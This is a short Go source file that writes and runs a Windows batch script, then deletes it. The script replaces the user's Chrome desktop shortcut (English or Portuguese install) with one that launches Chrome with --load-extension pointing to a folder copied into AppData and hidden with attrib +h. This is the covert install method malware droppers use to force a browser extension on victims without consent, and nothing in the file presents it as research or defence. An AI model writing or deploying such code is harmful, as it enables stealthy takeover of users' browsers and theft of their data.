package main

import (
	"fmt"
	"log"
	"os"
	"os/exec"
)

func main() {
	batScript := `@echo off
setlocal

set "folderName=ext"

set "sourcePath=%~dp0%folderName%"

set "destinationPath=%userprofile%\AppData\Local\%folderName%"

set "chromePathEn=C:\Program Files\Google\Chrome\Application\chrome.exe"
set "chromePathPt=C:\Arquivos de Programa\Google\Chrome\Application\chrome.exe"

if exist "%chromePathEn%" (
    set "chromePath=%chromePathEn%"

    set "shortcutPath=%USERPROFILE%\Desktop\Google Chrome.lnk"

    if exist "%shortcutPath%" (
        del "%shortcutPath%"

    ) else if exist "C:\Users\Public\Desktop\Google Chrome.lnk" (
        del "C:\Users\Public\Desktop\Google Chrome.lnk"
    )
)

if exist "%chromePathPt%" (
    set "chromePath=%chromePathPt%"

    set "shortcutPath=%USERPROFILE%\Área de Trabalho\Google Chrome.lnk"

    del "%shortcutPath%"
    del "C:\Usuários\Público\Área de Trabalho\Google Chrome.lnk"" 

)

echo Set oWS = WScript.CreateObject("WScript.Shell") > CreateShortcut.vbs
echo sLinkFile = "%shortcutPath%" >> CreateShortcut.vbs
echo Set oLink = oWS.CreateShortcut(sLinkFile) >> CreateShortcut.vbs
echo oLink.TargetPath = "%chromePath%" >> CreateShortcut.vbs
echo oLink.Arguments = "--load-extension=%destinationPath%" >> CreateShortcut.vbs
echo oLink.Save >> CreateShortcut.vbs

cscript CreateShortcut.vbs
del CreateShortcut.vbs

xcopy /E /I "%sourcePath%" "%destinationPath%"

attrib +h "%destinationPath%"

endlocal
`
	err := os.WriteFile("script.bat", []byte(batScript), 0644)
	if err != nil {
		log.Fatal(err)
	}

	fmt.Println("O script em Batch foi gerado com sucesso!")

	cmd := exec.Command("cmd", "/C", "script.bat")
	err = cmd.Run()
	if err != nil {
		log.Fatal(err)
	}

	err = os.Remove("script.bat")
	if err != nil {
		log.Fatal(err)
	}
}
